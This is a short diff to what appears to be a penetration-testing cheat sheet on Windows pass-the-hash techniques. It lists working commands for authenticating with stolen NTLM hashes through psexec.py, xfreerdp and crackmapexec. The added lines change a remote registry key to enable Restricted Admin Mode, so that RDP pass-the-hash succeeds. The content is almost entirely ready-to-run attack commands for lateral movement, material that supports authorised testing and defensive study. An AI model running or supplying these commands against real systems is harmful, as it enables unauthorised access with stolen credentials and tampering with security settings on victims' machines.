@@ -223,6 +223,8 @@ $ python psexec.py [username]@[target] -hashes :[NT/NTLM]
 
 # Method 4 - RDP PTH
 $ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
+^If error occurs "Account Restrictions are preventing this user from signing in.” enable Restricted Admin Mode:
+$ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 
 # Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
 $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
